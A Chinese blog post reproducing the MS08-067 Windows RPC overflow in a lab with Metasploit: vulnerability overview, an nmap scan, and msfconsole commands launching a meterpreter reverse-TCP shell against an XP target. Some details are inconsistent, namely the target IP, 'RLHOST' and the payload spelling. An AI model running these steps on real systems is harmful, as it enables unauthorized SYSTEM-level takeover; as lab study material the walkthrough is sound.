---
layout: mypost
title: Metasploit-EclipsedWing 黯淡羽翼(MS08_067) 复现
categories: [Metasploit]
---


## 一. 概述
Microsoft Windows是美国微软（Microsoft）公司发布的一系列操作系统。 Windows的Server服务在处理特制RPC请求时存在缓冲区溢出漏洞。远程攻击者可以通过发送恶意的RPC请求触发这个溢出，导致完全入侵用户系统，以SYSTEM权限执行任意指令。 对于Windows 2000、XP和Server 2003，无需认证便可以利用这个漏洞；对于Windows Vista和Server 2008，可能需要进行认证。 目前这个漏洞正在被名为TrojanSpy:Win32/Gimmiv.A和TrojanSpy:Win32/Gimmiv.A.dll的木马积极的利用。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200806220323485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center)


详情请查阅下方微软官方文档

概览| 
-------- | -----
中文名：黯淡羽翼| 
微软官方编号：[MS08-067](https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2008/ms08-067)| 
CVE编号：[CVE-2008-4250](http://cve.scap.org.cn/vuln/VH-CVE-2008-4250)  | 
类型：远程代码执行|
官方评级：严重|
影响系统：win2000，winxp，winserver03|


## 二. 复现
这是一个有年代的漏洞了
| 攻击机 | 靶机 |
|--|--|
| IP：192.168.5.111 | 192.168.5.113 |
|OS：kali-linux | WindowsXPsp2

### 1.端口扫描
```powershell
root@kali-linux-wp:~# nmap -sS -Pn 192.168.5.114
Starting Nmap 7.70 ( https://nmap.org ) at 2020-08-06 22:20 CST
Nmap scan report for 192.168.5.114
Host is up (0.0017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2869/tcp open  icslap
MAC Address: 00:0C:29:9A:9C:2B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.95 seconds
```

### 2.调用载荷
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200806222236380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center)

### 3. 配置IP，payload

```powershell
$ show options
$ set RHOSTS 192.168.5.114
$ set payload windows/meterpreter/reverse_ tcp
$ set RLHOST 192.168.5.111
$ exploit
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200806222401241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200806222708542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200806222822950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center)




